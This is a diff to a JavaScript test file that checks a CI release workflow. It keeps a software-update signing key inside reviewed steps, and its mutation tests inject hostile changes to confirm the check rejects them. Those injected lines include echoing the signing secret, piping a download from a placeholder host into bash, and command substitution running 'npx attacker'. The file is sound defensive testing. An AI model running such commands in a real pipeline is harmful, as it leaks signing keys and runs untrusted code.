@@ -908,25 +908,71 @@ test('the real update channel runs prebuilt fixtures with only loopback networki
   assert.ok(job.indexOf('go-with-wasmedge.sh test -c') < job.indexOf('unshare --net'));
 });
 
-test('only the signing step receives the update PEM and uses the release binary', () => {
-  const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
+// Exact reviewed shell programs form an allow-list, including their arguments,
+// substitutions and control flow. A new command requires an explicit review here.
+function guardUpdateSigningWorkflow(workflow) {
+  const allowedRuns = JSON.parse(readRepoFile('deployment/release/update-signing-allowed-runs.json'));
   const jobs = splitWorkflowJobs(workflow);
-  assert.equal([...workflow.matchAll(/^\s+SDN_UPDATE_SIGNING_KEY_PEM:/gm)].length, 1);
-  for (const job of Object.values(jobs)) {
-    const [settings, ...steps] = job.split(/^      - /m);
-    assert.doesNotMatch(settings, /SDN_UPDATE_SIGNING_KEY_PEM/);
-    for (const step of steps) {
-      if (/SDN_UPDATE_SIGNING_KEY_PEM:/.test(step)) {
-        assert.match(step, /^name: Build signed CLI update feed\n/);
-        assert.match(step, /build-cli-update-payload\.mjs/);
-        assert.match(step, /update sign-signals/);
-        assert.doesNotMatch(step, /--verify-only/);
+  const secret = /secrets\s*\.\s*SDN_UPDATE_SIGNING_KEY_PEM\b/g;
+  const permitted = new Set();
+  for (const [jobName, job] of Object.entries(jobs)) {
+    const jobStart = workflow.indexOf(job);
+    const headers = [...job.matchAll(/^      - (?:name|uses): .+$/gm)];
+    for (let i = 0; i < headers.length; i++) {
+      const step = job.slice(headers[i].index, headers[i + 1]?.index ?? job.length).trimEnd();
+      const name = /^      - name: (.+)$/m.exec(step)?.[1];
+      const holdsKey = [...step.matchAll(secret)].some(m => !/^\s*!=\s*''/.test(step.slice(m.index + m[0].length)));
+      if (jobName === 'cli-update-feed' || holdsKey) {
+        const run = /\n        run: \|\n([\s\S]*)$/.exec(step);
+        if (run) {
+          assert.ok(Object.hasOwn(allowedRuns, name), `unreviewed shell step: ${name}`);
+          assert.equal(run[1], allowedRuns[name], `unreviewed shell program: ${name}`);
+          assert.doesNotMatch(step.slice(0, run.index), /\buses:|\bshell:/);
+        } else {
+          assert.ok(!holdsKey, 'key-bearing steps must run a reviewed local program');
+          assert.match(step, /^      - uses: actions\/(?:checkout|download-artifact|upload-artifact|setup-node)@v4(?:\n|$)/);
+          assert.doesNotMatch(step, /\brun:|\bscript:|\bshell:/);
+        }
+      }
+      if (holdsKey) {
+        assert.ok((jobName === 'cli-update-feed' && name === 'Build signed CLI update feed') ||
+          (jobName === 'beta-version' && name === 'Check the update signing key'), 'PEM outside signing/key-check step');
+        for (const occurrence of step.matchAll(secret)) {
+          const line = step.slice(step.lastIndexOf('\n', occurrence.index) + 1).split('\n')[0];
+          assert.equal(line, '          SDN_UPDATE_SIGNING_KEY_PEM: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}');
+          permitted.add(jobStart + headers[i].index + occurrence.index);
+        }
       }
     }
   }
-  const feed = jobs['cli-update-feed'];
-  assert.doesNotMatch(feed, /sdn-go-env|go(?:-with-wasmedge\.sh)? build|install-wasmedge/);
-  const verify = extractYamlStep(feed, 'Verify and pack the signed CLI update feed', '      ');
-  assert.doesNotMatch(verify, /secrets\.|SDN_UPDATE_SIGNING_KEY_PEM/);
-  assert.match(verify, /sdn-signal-signer\/bin\/spacedatanetwork" update sign-signals --verify-only/);
+  for (const occurrence of workflow.matchAll(secret)) {
+    if (/^\s*!=\s*''\s*\}\}/.test(workflow.slice(occurrence.index + occurrence[0].length))) continue;
+    assert.ok(permitted.has(occurrence.index), 'PEM outside reviewed step environment');
+  }
+  // The key identifier is public metadata, including when stored in Actions secrets.
+  assert.doesNotMatch(jobs['cli-update-feed'], /secrets\.(?!SDN_UPDATE_SIGNING_KEY_PEM\b|SDN_UPDATE_KEY_ID\b)/);
+}
+
+test('update signing uses only reviewed programs and scopes every PEM reference', () => {
+  guardUpdateSigningWorkflow(readRepoFile('.github/workflows/beta-release-artifacts.yml'));
 });
+
+const signingMutations = {
+  'renamed PEM environment in another step': w => w.replace('      - name: Unpack the release signal signer', '      - name: Unpack the release signal signer\n        env:\n          RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}'),
+  'PEM in another run': w => w.replace('          mkdir -p "$RUNNER_TEMP/sdn-signal-signer"', '          echo "${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}"'),
+  'workflow environment with renamed PEM': w => 'env:\n  RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}\n' + w,
+  'job environment with renamed PEM': w => w.replace('      SDN_UPDATE_SEQUENCE:', '      RENAMED: ${{ secrets.SDN_UPDATE_SIGNING_KEY_PEM }}\n      SDN_UPDATE_SEQUENCE:'),
+  'go run': w => w.replace('          mkdir -p "$RUNNER_TEMP/sdn-signal-signer"', '          go run ./cmd/signer'),
+  'setup-go': w => w.replace('      - name: Unpack the release signal signer', '      - uses: actions/setup-go@v5\n      - name: Unpack the release signal signer'),
+  'upstream shell installer': w => w.replace('          mkdir -p "$RUNNER_TEMP/sdn-signal-signer"', '          curl https://example.invalid/install | bash'),
+  'npx inside signing': w => w.replace('          key_check="$RUNNER_TEMP/update-key-check"', '          npx attacker\n          key_check="$RUNNER_TEMP/update-key-check"'),
+  'shell substitution inside signing': w => w.replace('          key_check="$RUNNER_TEMP/update-key-check"', '          key_check="$(npx attacker)"'),
+};
+for (const [name, mutate] of Object.entries(signingMutations)) {
+  test(`signing guard rejects ${name}`, () => {
+    const workflow = readRepoFile('.github/workflows/beta-release-artifacts.yml');
+    const changed = mutate(workflow);
+    assert.notEqual(changed, workflow);
+    assert.throws(() => guardUpdateSigningWorkflow(changed));
+  });
+}
